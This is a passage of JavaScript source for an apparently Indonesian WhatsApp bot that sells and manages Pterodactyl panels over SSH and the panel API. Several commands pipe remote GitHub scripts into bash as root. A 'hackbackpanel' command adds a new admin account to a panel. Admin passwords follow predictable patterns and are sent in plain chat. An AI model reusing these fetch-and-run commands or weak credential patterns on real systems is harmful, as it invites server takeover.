ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await RyuuBotz.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By ReinzID\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By ReinzID\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  
//================================================================================
case "startwings": case "configurewings": {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split('|')
if (t.length < 3) return reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//================================================================================
case "hbpanel": case "hackbackpanel": {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split('|')
if (t.length < 2) return reply("ipvps|pwvps")

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await RyuuBotz.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
//==================================================================
case 'listusr': {
  if (!isRyuuPartner) return reply(mess.only.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await RyuuBotz.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case 'delsrv': {
      if (!isRyuuPartner) return reply(mess.only.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case 'delusr': {
  if (!isRyuuPartner) return reply(mess.only.owner)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                
case 'listsrv': {
  if (!isRyuuPartner) return reply(mess.only.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await RyuuBotz.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;

case 'tutorial': {
const owned = global.owner + `@s.whatsapp.net`
const text12 = ReinzIDliatwaktu + ` *@${sender.split("@")[0]}*

▭▬▭( *TUTOR RUN* )▭▬▭

*TUTOR RUN BOT*
( https://youtu.be/rqqxkI4P8YY )

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
RyuuBotz.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break;
case "cadminv2":
case "createadminv2": {
if (!isRyuuPartner) return reply(mess.only.owner)
if (!text) return reply("username")
let username = text.toLowerCase()
let email = username+"@ryuu.buyy"
let name = capital(args[0])
let password = username+"-ryuu"
let f = await fetch(domainv2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainv2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await RyuuBotz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isRyuuPartner) return reply(mess.only.owner)
if (!text) return reply("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@ryuu.buyer"
let name = (username) + " Server"
let password = (username) + "-ryuu"
let f = await fetch(domainv2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainv2 + `/api/application/nests/${nestidv2}/eggs/` + eggv2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainv2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggv2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locv2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainv2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await RyuuBotz.sendMessage(orang, {
      text: teks,
      contextInfo: {
        externalAdReply: {
          title: 'Your Panel',
          body: `Thanks for buying panel`,
          thumbnailUrl: 'https://files.catbox.moe/m2xkzf.jpg',
          sourceUrl: global.saluran,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    })
delete global.panel
}
break
case "listadminv2": {
if (!isRyuuPartner) return reply(mess.only.owner)
let cek = await fetch(domainv2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await RyuuBotz.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break
case "listpanelv2": case "listpv2": case "listserverv2": {
if (!isRyuuPartner) return reply(mess.only.owner)
let f = await fetch(domainv2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainv2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyv2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await RyuuBotz.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break
case "deladminv2": {
if (!isRyuuPartner) return reply(mess.only.owner)
if (!text) return reply("idnya")
let cek = await fetch(domainv2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainv2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return reply("Akun admin panel tidak ditemukan!")
await reply(`Berhasil menghapus akun admin panel *${getid}*`)
}
break
case "delpanelv2": {
if (!isRyuuPartner) return reply(mess.only.owner)
if (!text) return reply("idnya")
let f = await fetch(domainv2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainv2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainv2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainv2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyv2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return reply("Server panel tidak ditemukan!")
reply(`Berhasil menghapus server panel *${nameSrv}*`)
}
break
case 'panel': {
if (!isRyuuPartner) return reply(mess.only.owner)
  await replyryuu(`
▭▬▭▬▭( *SERVER V1* )▭▬▭▬▭

.1gb [username,nomor]
.2gb [username,nomor]
.3gb [username,nomor]
.4gb [username,nomor]
.5gb [username,nomor]
.6gb [username,nomor]
.7gb [username,nomor]
.8gb [username,nomor]
.9gb [username,nomor]
.10gb [username,nomor]
.unli [username,nomor]

▭▬▭▬▭( *SERVER V2* )▭▬▭▬▭

.1gb-v2 [username]
.2gb-v2 [username]
.3gb-v2 [username]
.4gb-v2 [username]
.5gb-v2 [username]
.6gb-v2 [username]
.7gb-v2 [username]
.8gb-v2 [username]
.9gb-v2 [username]
.10gb-v2 [username]
.unli-v2 [username]
.cadminv2 [id]
.deladminv2 [id]
.listserverv2 [id]
.delpanelv2 [id]

Contoh:
.ram username,nomor
.1gb Reinz-Client,62xxxxxxxx
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭
  `.trim())
}
break;
case 'addsrv': {
if (!isRyuuPartner) return reply(mess.only.owner)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
// = data.attributes.pStartup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "🐺 BUYER ReinzID Chx 🐺 || PANEL NYA DI PAKEK YA BUB >•<",
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "/usr/local/bin/${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start",
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case 'suspend': {
            if (!isRyuuPartner) return reply(mess.only.owner)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'unsuspend': {
            if (!isRyuuPartner) return reply(mess.only.owner)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'createadmin': {
if (!isRyuuPartner) return reply(mess.only.owner)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "46093"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await RyuuBotz.sendMessage(m.chat, listMessage)

    await RyuuBotz.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n
USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}


*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

}
break
                case 'createadmin2': {
if (!isRyuuPartner) return reply(mess.only.owner)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "46093"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Admin",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: Admin

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

`
    const listMessage = {

        text: tks,

    }

	

    await RyuuBotz.sendMessage(m.chat, listMessage)

    await RyuuBotz.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n
USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain2}


*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
        case 'listadmin': {
  if (!isRyuuPartner) return reply(mess.only.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await RyuuBotz.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case 'unli': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "0"
let cpu = "0"
let disk = "0"
